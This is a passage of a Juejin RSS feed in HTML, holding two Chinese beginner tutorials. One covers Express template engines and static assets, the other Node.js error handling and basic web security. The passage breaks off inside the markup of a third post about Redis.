content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：模板引擎与静态资源
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T05:48:21.000Z" title="Thu Jan 01 2026 05:48:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在早期 Web 开发中，服务器不仅负责接口，还需要直接渲染页面。即便在前后端分离成为主流的今天，模板引擎在后台管理系统、SEO 页面以及快速原型开发中仍然发挥着重要作用。同时，静态资源的合理管理，也是 Web 服务稳定运行的基础。</p>
</blockquote>
<p>本文将介绍 Node.js 中模板引擎的基本使用方式，以及静态资源的管理与服务策略。</p>
<hr/>
<h2 data-id="heading-0">一、什么是模板引擎</h2>
<p>模板引擎用于将数据与 HTML 模板结合，生成最终返回给浏览器的页面。开发者只需编写模板结构和变量占位符，具体数据由服务器在运行时注入。</p>
<p>这种方式可以有效避免在服务端拼接大量字符串，使页面结构更加清晰，也更易维护。</p>
<hr/>
<h2 data-id="heading-1">二、Node.js 常见模板引擎</h2>
<p>在 Node.js 生态中，有多种模板引擎可供选择。</p>
<ul>
<li>EJS：语法接近原生 JavaScript，上手简单</li>
<li>Pug：语法简洁，强调结构表达</li>
<li>Handlebars：逻辑与视图分离较严格</li>
</ul>
<p>Express 对这些模板引擎都提供了良好的支持，可以根据项目需求自由选择。</p>
<hr/>
<h2 data-id="heading-2">三、Express 中配置模板引擎</h2>
<p>在 Express 应用中，模板引擎的配置通常包括视图目录和模板类型。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();

app.<span class="hljs-title function_">set</span>(<span class="hljs-string">'views'</span>, <span class="hljs-string">'./views'</span>);
app.<span class="hljs-title function_">set</span>(<span class="hljs-string">'view engine'</span>, <span class="hljs-string">'ejs'</span>);
</code></pre>
<p>配置完成后，Express 会自动根据模板名称查找并渲染对应文件。</p>
<hr/>
<h2 data-id="heading-3">四、渲染模板页面</h2>
<p>通过 <code>res.render</code> 可以将数据传递给模板并生成 HTML。</p>
<pre><code class="hljs language-js" lang="js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">'index'</span>, {
    <span class="hljs-attr">title</span>: <span class="hljs-string">'Node.js'</span>,
    <span class="hljs-attr">user</span>: <span class="hljs-string">'admin'</span>
  });
});
</code></pre>
<p>模板文件中即可使用传入的数据进行渲染，页面逻辑清晰且易于扩展。</p>
<hr/>
<h2 data-id="heading-4">五、模板引擎的常见使用场景</h2>
<p>模板引擎在以下场景中非常实用：</p>
<ul>
<li>后台管理系统页面</li>
<li>服务端渲染的 SEO 页面</li>
<li>邮件或静态页面生成</li>
<li>快速搭建演示项目</li>
</ul>
<p>对于需要首屏渲染或对搜索引擎友好的应用，模板引擎依然是可靠选择。</p>
<hr/>
<h2 data-id="heading-5">六、静态资源的概念</h2>
<p>静态资源指不需要服务器动态处理的文件，例如：</p>
<ul>
<li>CSS 样式文件</li>
<li>JavaScript 脚本</li>
<li>图片、字体等资源</li>
</ul>
<p>合理管理静态资源，有助于提升页面加载速度和用户体验。</p>
<hr/>
<h2 data-id="heading-6">七、Express 中的静态资源服务</h2>
<p>Express 提供了内置的静态资源中间件。</p>
<pre><code class="hljs language-js" lang="js">app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">'public'</span>));
</code></pre>
<p>配置后，<code>public</code> 目录下的文件即可通过 URL 直接访问，无需额外路由处理。</p>
<hr/>
<h2 data-id="heading-7">八、模板引擎与静态资源的协作</h2>
<p>在实际项目中，模板引擎和静态资源通常协同工作。</p>
<p>模板负责生成页面结构，静态资源负责页面样式和交互逻辑。这种分工让前后端职责更加清晰，也方便后续维护。</p>
<hr/>
<h2 data-id="heading-8">九、静态资源管理建议</h2>
<p>在项目中管理静态资源时，应注意以下几点：</p>
<ul>
<li>目录结构清晰，按类型分类</li>
<li>文件命名规范，便于维护</li>
<li>避免在模板中写大量内联样式</li>
<li>大型项目可考虑使用 CDN 加速</li>
</ul>
<p>良好的资源管理方式可以显著提升系统稳定性。</p>
<hr/>
<h2 data-id="heading-9">十、服务端渲染与前端构建的结合</h2>
<p>在部分项目中，会将前端构建产物作为静态资源由 Node.js 服务提供。这种方式可以在保证开发效率的同时，兼顾部署和访问性能。</p>
<p>Node.js 在这一过程中主要负责路由控制和资源分发。</p>
<hr/>
<h2 data-id="heading-10">十一、总结</h2>
<p>模板引擎与静态资源是 Node.js Web 应用中不可忽视的组成部分。模板引擎让服务端渲染更加优雅，而静态资源管理则直接影响系统性能和用户体验。</p>
<p>根据项目规模和业务需求合理选择渲染方式，是构建稳定 Web 应用的重要一步。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：错误处理与安全防护]]></title>    <link>https://juejin.cn/post/7589838742552231955</link>    <guid>https://juejin.cn/post/7589838742552231955</guid>    <pubDate>2026-01-01T05:48:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589838742552231955" data-draft-id="7589893746080464937" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：错误处理与安全防护"/> <meta itemprop="keywords" content="后端,前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-01T05:48:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：错误处理与安全防护
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T05:48:45.000Z" title="Thu Jan 01 2026 05:48:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在 Node.js 应用走向生产环境之后，错误处理和安全防护的重要性会被无限放大。一次未捕获的异常，可能导致整个服务崩溃；一个未校验的输入参数，可能引发严重的安全漏洞。相比功能实现，稳定性和安全性往往决定了系统能否长期运行。</p>
</blockquote>
<p>本文将从 Node.js 常见错误类型入手，结合实际开发经验，介绍错误处理机制与安全防护的基本策略。</p>
<hr/>
<h2 data-id="heading-0">一、Node.js 中的常见错误类型</h2>
<p>在实际项目中，Node.js 的错误大致可以分为几类。</p>
<p>第一类是运行时错误，例如变量未定义、类型错误等。
第二类是异步错误，例如 Promise 被拒绝却未处理。
第三类是业务错误，例如参数不合法、权限不足。
第四类是系统错误，例如数据库连接失败、文件读写异常。</p>
<p>对不同类型的错误进行区分处理，有助于提高系统稳定性和可维护性。</p>
<hr/>
<h2 data-id="heading-1">二、同步与异步错误处理方式</h2>
<p>同步代码可以使用 <code>try...catch</code> 进行捕获。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">try</span> {
  <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'invalid json'</span>);
} <span class="hljs-keyword">catch</span> (err) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">message</span>);
}
</code></pre>
<p>而异步代码如果不进行处理，错误很容易被忽略，导致进程异常退出。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'fail'</span>)).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
});
</code></pre>
<p>在 Node.js 中，必须养成对每一个异步操作进行错误处理的习惯。</p>
<hr/>
<h2 data-id="heading-2">三、Express 中的错误处理机制</h2>
<p>在使用 Express 构建 Web 服务时，应统一使用错误处理中间件。</p>
<pre><code class="hljs language-js" lang="js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">err, req, res, next</span>) =&gt;</span> {
  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({
    <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span>
  });
});
</code></pre>
<p>集中处理错误可以避免在每个路由中重复编写错误逻辑，同时也方便日志记录和错误监控。</p>
<hr/>
<h2 data-id="heading-3">四、未捕获异常与进程保护</h2>
<p>Node.js 提供了全局异常监听机制。</p>
<pre><code class="hljs language-js" lang="js">process.<span class="hljs-title function_">on</span>(<span class="hljs-string">'uncaughtException'</span>, <span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'uncaughtException'</span>, err);
});

process.<span class="hljs-title function_">on</span>(<span class="hljs-string">'unhandledRejection'</span>, <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'unhandledRejection'</span>, reason);
});
</code></pre>
<p>这些机制可以防止服务悄无声息地崩溃，但并不意味着可以忽略代码层面的错误处理。全局监听更适合作为最后一道防线。</p>
<hr/>
<h2 data-id="heading-4">五、输入校验与参数安全</h2>
<p>安全问题往往来源于不可信的用户输入。所有外部输入都必须进行校验。</p>
<p>常见校验内容包括：</p>
<ul>
<li>参数类型是否合法</li>
<li>必填字段是否缺失</li>
<li>字符长度是否超限</li>
</ul>
<p>通过统一校验规则，可以有效防止逻辑错误和安全漏洞。</p>
<hr/>
<h2 data-id="heading-5">六、常见 Web 安全风险</h2>
<p>Node.js Web 应用常见的安全风险包括：</p>
<ul>
<li>SQL 注入</li>
<li>XSS 跨站脚本攻击</li>
<li>CSRF 跨站请求伪造</li>
<li>路径遍历攻击</li>
</ul>
<p>这些问题并非 Node.js 独有，但如果防护不当，同样会造成严重后果。</p>
<hr/>
<h2 data-id="heading-6">七、基础安全防护策略</h2>
<p>在实际项目中，应至少做好以下防护措施。</p>
<ul>
<li>对用户输入进行严格校验和转义</li>
<li>使用安全的数据库操作方式</li>
<li>对敏感接口进行身份认证</li>
<li>隐藏服务器敏感信息</li>
<li>限制请求频率，防止恶意攻击</li>
</ul>
<p>安全防护不是一次性工作，而是持续演进的过程。</p>
<hr/>
<h2 data-id="heading-7">八、HTTP 安全相关设置</h2>
<p>通过合理设置 HTTP 响应头，可以增强应用安全性。</p>
<pre><code class="hljs language-js" lang="js">app.<span class="hljs-title function_">disable</span>(<span class="hljs-string">'x-powered-by'</span>);
</code></pre>
<p>隐藏技术栈信息可以减少被攻击的概率，是最基础但有效的防护方式之一。</p>
<hr/>
<h2 data-id="heading-8">九、日志与错误信息的安全性</h2>
<p>错误日志对于排查问题非常重要，但不能将敏感信息暴露给客户端。</p>
<p>在生产环境中，应避免直接返回错误堆栈，统一返回通用错误提示，而将详细信息记录在日志中。</p>
<hr/>
<h2 data-id="heading-9">十、生产环境的安全意识</h2>
<p>在生产环境中，安全往往比功能更重要。</p>
<ul>
<li>不信任任何客户端输入</li>
<li>最小权限原则</li>
<li>及时修复依赖漏洞</li>
<li>定期审计日志和访问记录</li>
</ul>
<p>良好的安全习惯，是系统长期稳定运行的保障。</p>
<hr/>
<h2 data-id="heading-10">十一、总结</h2>
<p>错误处理与安全防护是 Node.js 应用不可忽视的基础能力。一个健壮的系统，必须在每一个环节都做好异常兜底和安全防护。</p>
<p>越早建立规范，后期维护成本就越低。对于任何计划长期运行的 Node.js 项目来说，安全和稳定永远值得投入精力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redis性能翻倍的5个关键策略：从慢查询到百万QPS的实战优化]]></title>    <link>https://juejin.cn/post/7589940913766465571</link>    <guid>https://juejin.cn/post/7589940913766465571</guid>    <pubDate>2026-01-01T04:16:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940913766465571" data-draft-id="7589870367764398120" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redis性能翻倍的5个关键策略：从慢查询到百万QPS的实战优化"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2026-01-01T04:16:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redis性能翻倍的5个关键策略：从慢查询到百万QPS的实战优化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T04:16:55.000Z" title="Thu Jan 01 2026 04:16:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul 